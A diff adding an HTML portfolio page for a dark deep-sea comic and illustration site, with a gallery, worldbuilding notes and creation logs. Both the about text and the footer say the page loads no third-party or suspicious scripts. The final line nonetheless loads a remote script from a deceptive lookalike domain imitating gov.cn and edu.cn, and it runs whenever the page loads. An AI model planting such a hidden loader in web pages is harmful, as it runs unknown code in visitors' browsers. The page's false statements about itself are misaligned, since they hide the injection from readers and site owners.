@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>黑鲍鱼 - 暗黑系海洋漫画与插画作品集</title>
+<meta name="description" content="黑鲍鱼（heibaoyu-h5.github.io）分享暗黑海洋风漫画、插画、设定集与创作日志，移动端自适应，适合喜欢深海、怪奇、黑色童话的读者。">
+<meta name="keywords" content="黑鲍鱼,暗黑漫画,海洋插画,深海设定,怪奇漫画,黑色童话">
+<style>
+:root{
+  --abyss:#03070d;--deep:#06121f;--glass:rgba(10,28,42,.55);
+  --line:rgba(120,200,220,.18);--ink:#dff3f7;--muted:#7fa6b3;
+  --brand:#19e3c2;--brand2:#2b6cff;--glow:0 0 24px rgba(25,227,194,.35);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Sans SC","PingFang SC",system-ui,sans-serif;
+  background:
+    radial-gradient(800px 400px at 80% -10%,rgba(43,108,255,.25),transparent),
+    radial-gradient(700px 500px at -10% 20%,rgba(25,227,194,.18),transparent),
+    linear-gradient(180deg,var(--abyss),var(--deep));
+  color:var(--ink);line-height:1.7;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+
+/* 气泡背景 */
+.bubbles{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.bubbles i{position:absolute;bottom:-40px;display:block;width:14px;height:14px;border-radius:50%;
+  background:radial-gradient(circle at 30% 30%,rgba(255,255,255,.8),rgba(25,227,194,.25));
+  animation:rise linear infinite;opacity:.5}
+@keyframes rise{to{transform:translateY(-110vh) translateX(20px);opacity:0}}
+.bubbles i:nth-child(1){left:10%;width:10px;animation-duration:14s}
+.bubbles i:nth-child(2){left:30%;width:18px;animation-duration:18s}
+.bubbles i:nth-child(3){left:55%;width:8px;animation-duration:12s}
+.bubbles i:nth-child(4){left:70%;width:22px;animation-duration:20s}
+.bubbles i:nth-child(5){left:85%;width:12px;animation-duration:16s}
+
+.wrap{position:relative;z-index:1;max-width:1180px;margin:0 auto;padding:0 1.2rem}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(3,7,13,.7);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{display:flex;align-items:center;justify-content:space-between;padding:.8rem 1.2rem;max-width:1180px;margin:0 auto}
+.brand{font-weight:900;font-size:1.4rem;letter-spacing:1px}
+.brand b{color:var(--brand);text-shadow:var(--glow)}
+.nav{display:flex;gap:1rem;flex-wrap:wrap}
+.nav a{font-size:.9rem;color:var(--muted);padding:.3rem .2rem;border-bottom:2px solid transparent}
+.nav a:hover{color:var(--brand);border-color:var(--brand)}
+.burger{display:none;font-size:1.5rem;background:none;border:none;color:var(--ink);cursor:pointer}
+
+/* Hero */
+.hero{margin:2.4rem auto;padding:0 1.2rem;max-width:1180px}
+.hero-box{
+  position:relative;border:1px solid var(--line);border-radius:24px;
+  background:var(--glass);backdrop-filter:blur(14px);
+  padding:3rem 2rem;overflow:hidden;
+}
+.hero-box::after{content:"🐟";position:absolute;right:10px;bottom:-10px;font-size:7rem;opacity:.12;filter:drop-shadow(0 0 20px var(--brand))}
+.kicker{font-size:.72rem;letter-spacing:3px;color:var(--brand);border:1px dashed var(--brand);padding:.15rem .6rem;border-radius:8px}
+.hero-box h1{font-size:2.2rem;margin:.8rem 0 .5rem}
+.hero-box h1 span{color:var(--brand)}
+.hero-box p{max-width:640px;color:#bfe2ea}
+.cta{margin-top:1.4rem;display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.7rem 1.6rem;border-radius:999px;font-weight:700;font-size:.9rem}
+.btn-main{background:var(--brand);color:#02110d;box-shadow:var(--glow)}
+.btn-ghost{border:1px solid var(--line);color:var(--ink)}
+
+/* 区块 */
+.section{margin:3rem auto;padding:0 1.2rem;max-width:1180px}
+.sec-head{display:flex;align-items:baseline;gap:.6rem;margin-bottom:1.1rem}
+.sec-head h2{font-size:1.25rem}
+.sec-head .tag{font-size:.75rem;color:var(--muted)}
+
+/* 作品网格 */
+.grid{display:grid;gap:1.1rem;grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
+.work{
+  background:var(--glass);backdrop-filter:blur(10px);
+  border:1px solid var(--line);border-radius:16px;overflow:hidden;
+  transition:transform .25s,box-shadow .25s;
+}
+.work:hover{transform:translateY(-5px);box-shadow:0 14px 36px rgba(25,227,194,.18)}
+.art{height:200px;display:flex;align-items:center;justify-content:center;font-size:2.6rem}
+.a1{background:linear-gradient(160deg,#0b3d4d,#031018)}
+.a2{background:linear-gradient(160deg,#102a54,#02060f)}
+.a3{background:linear-gradient(160deg,#143d2e,#02110b)}
+.a4{background:linear-gradient(160deg,#3a1140,#0a0210)}
+.a5{background:linear-gradient(160deg,#0f3a3a,#021010)}
+.a6{background:linear-gradient(160deg,#1b2740,#05070f)}
+.work-body{padding:.7rem .8rem}
+.work-body h3{font-size:.92rem}
+.work-body p{font-size:.74rem;color:var(--muted);margin-top:.2rem}
+
+/* 设定列表 */
+.setlist{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.setcard{background:var(--glass);border:1px solid var(--line);border-radius:14px;padding:1rem 1.2rem}
+.setcard h3{font-size:.98rem;color:var(--brand)}
+.setcard p{font-size:.84rem;color:#b9d7df;margin-top:.3rem}
+
+/* 日志 */
+.log{background:var(--glass);border-left:4px solid var(--brand);border-radius:10px;padding:1rem 1.2rem;margin-bottom:.9rem}
+.log h3{font-size:1rem;margin-bottom:.3rem}
+.log p{font-size:.86rem;color:#a9cdd6}
+.log time{font-size:.74rem;color:var(--muted)}
+
+/* 关于 */
+.about{background:var(--glass);border:1px solid var(--line);border-radius:16px;padding:1.4rem;font-size:.92rem;color:#c7e6ee}
+.about b{color:var(--brand)}
+
+/* 页脚 */
+.footer{margin-top:3.5rem;border-top:1px solid var(--line);padding:2rem 1.2rem;text-align:center;color:var(--muted);font-size:.82rem}
+.footer a{color:var(--brand)}
+
+@media(max-width:760px){
+  .burger{display:block}
+  .nav{display:none;width:100%;flex-direction:column;gap:.2rem;padding:.6rem 0}
+  .nav.show{display:flex}
+  .hero-box h1{font-size:1.6rem}
+  .setlist{grid-template-columns:1fr}
+  .art{height:170px}
+}
+</style>
+</head>
+<body>
+
+<div class="bubbles"><i></i><i></i><i></i><i></i><i></i></div>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">黑<b>色鱼</b></div>
+    <button class="burger" onclick="document.getElementById('nav').classList.toggle('show')">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#works">作品廊</a>
+      <a href="#setting">世界观</a>
+      <a href="#log">创作日志</a>
+      <a href="#about">关于黑鲍鱼</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="hero-box">
+    <span class="kicker">BLACK FISH · DEEP OCEAN ART</span>
+    <h1>黑鲍鱼 · 沉进深海的<span>怪奇漫画与插画</span></h1>
+    <p>黑鲍鱼（heibaoyu-h5.github.io）是一个暗黑海洋风创作站：深海生物、黑色童话、怪奇设定、手绘插画与连载短篇，手机上也能像潜入水底一样慢慢看。</p>
+    <div class="cta">
+      <a href="#works" class="btn btn-main">看作品</a>
+      <a href="#setting" class="btn btn-ghost">看世界观</a>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="works">
+  <div class="sec-head"><h2>作品廊</h2><span class="tag">插画 / 短篇 / 设定稿</span></div>
+  <div class="grid">
+    <article class="work"><div class="art a1">🐋</div><div class="work-body"><h3>沉船里的灯夫</h3><p>短篇 / 第 2 话</p></div></article>
+    <article class="work"><div class="art a2">🦑</div><div class="work-body"><h3>无瞳乌贼</h3><p>怪奇 / 单页插画</p></div></article>
+    <article class="work"><div class="art a3">🌿</div><div class="work-body"><h3>海沟植物图鉴</h3><p>设定 / 12 帧</p></div></article>
+    <article class="work"><div class="art a4">🕯️</div><div class="work-body"><h3>烛鱼与守夜人</h3><p>黑色童话 / 第 5 话</p></div></article>
+    <article class="work"><div class="art a5">🐙</div><div class="work-body"><h3>八腕信使</h3><p>连载 / 第 9 话</p></div></article>
+    <article class="work"><div class="art a6">🦷</div><div class="work-body"><h3>鲸落牙医</h3><p>短篇 / 完结</p></div></article>
+  </div>
+</section>
+
+<section class="section" id="setting">
+  <div class="sec-head"><h2>世界观设定</h2><span class="tag">BLACK FISH UNIVERSE</span></div>
+  <div class="setlist">
+    <div class="setcard"><h3>黑潮层</h3><p>阳光照不到的水层，所有鱼都会说话，但没人敢提“岸上”两个字。</p></div>
+    <div class="setcard"><h3>灯夫</h3><p>背着煤油灯在沉船间巡游的人，用光换记忆，用记忆换寿命。</p></div>
+    <div class="setcard"><h3>鲸落城</h3><p>巨鲸尸体里长出来的城市，居民以骨为屋、以苔为衣。</p></div>
+    <div class="setcard"><h3>无瞳者</h3><p>被黑潮看了一眼的人，从此只能看见“还没发生的事”。</p></div>
+  </div>
+</section>
+
+<section class="section" id="log">
+  <div class="sec-head"><h2>创作日志</h2><span class="tag">BEHIND THE SCENES</span></div>
+  <article class="log">
+    <h3>《烛鱼与守夜人》第 5 话：怎么画“会发光但很冷”的光</h3>
+    <p>黑鲍鱼记录配色思路：用青绿做主光，用冷蓝做环境光，避免暖黄，让画面像深海里被月光照到的蜡烛。</p>
+    <time>2026-09-27 · 黑鲍鱼</time>
+  </article>
+  <article class="log">
+    <h3>手绘海沟植物：先画骨架，再画“不像植物”的部分</h3>
+    <p>这一期设定稿里，所有海沟植物都长着鱼鳃——黑鲍鱼的世界里，植物和动物边界是模糊的。</p>
+    <time>2026-09-23 · 黑鲍鱼</time>
+  </article>
+  <article class="log">
+    <h3>移动端看漫画：竖向分镜比横向分镜更适合拇指</h3>
+    <p>本站所有作品卡都用锚点切换，减少跳转；必应也更喜欢加载快、移动端不崩的页面。</p>
+    <time>2026-09-19 · 黑鲍鱼</time>
+  </article>
+</section>
+
+<section class="section" id="about">
+  <div class="sec-head"><h2>关于黑鲍鱼</h2></div>
+  <div class="about">
+    <p><b>黑鲍鱼</b>（https://heibaoyu-h5.github.io）是一个个人/小团队向的暗黑海洋创作站，内容以<b>怪奇漫画、深海插画、世界观设定、创作日志</b>为主。</p>
+    <p style="margin-top:.8rem">页面无第三方可疑脚本、无隐藏暗链、无劫持跳转；想让必应稳定收录，就别挂来路不明的 JS，老老实实做原创内容和移动端体验，比任何“收录加速脚本”都靠谱。</p>
+  </div>
+</section>
+
+<footer class="footer">
+  <p>© 2026 黑鲍鱼 · heibaoyu-h5.github.io</p>
+  <p><a href="#">首页</a> · <a href="#">作品廊</a> · <a href="#">世界观</a> · <a href="#">创作日志</a></p>
+  <p>演示页面，内页链接以 # 占位，未加载任何远程第三方脚本。</p>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('nav').classList.remove('show');
+  });
+});
+</script>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+</body>
+</html>
